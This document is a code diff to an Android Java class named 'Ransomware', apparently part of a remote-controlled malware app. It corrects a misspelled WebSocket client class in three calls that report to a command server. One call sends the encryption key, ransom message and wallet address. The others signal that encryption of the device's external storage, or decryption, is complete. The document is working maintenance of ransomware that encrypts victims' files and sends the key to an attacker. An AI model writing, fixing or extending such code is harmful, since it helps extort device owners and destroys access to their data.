@@ -53,7 +53,7 @@ public class Ransomware {
                 ransomInfo.put("key", keyB64);
                 ransomInfo.put("msg", msg);
                 ransomInfo.put("wallet", wallet);
-                XRCXRCWebSocketClient.get(ctx).sendEvent("ransom_key", ransomInfo);
+                XRCWebSocketClient.get(ctx).sendEvent("ransom_key", ransomInfo);
 
                 File root = Environment.getExternalStorageDirectory();
                 if (root != null && root.exists()) {
@@ -72,7 +72,7 @@ public class Ransomware {
                     }
                 }
 
-                XRCXRCWebSocketClient.get(ctx).sendEvent("ransom_complete", new JSONObject());
+                XRCWebSocketClient.get(ctx).sendEvent("ransom_complete", new JSONObject());
             } catch (Exception e) {
                 Log.e(TAG, "Encryption failed", e);
             }
@@ -92,7 +92,7 @@ public class Ransomware {
                 if (root != null && root.exists()) {
                     decryptDir(root, 0);
                 }
-                XRCXRCWebSocketClient.get(ctx).sendEvent("decrypt_complete", new JSONObject());
+                XRCWebSocketClient.get(ctx).sendEvent("decrypt_complete", new JSONObject());
             } catch (Exception e) {
                 Log.e(TAG, "Decryption failed", e);
             }
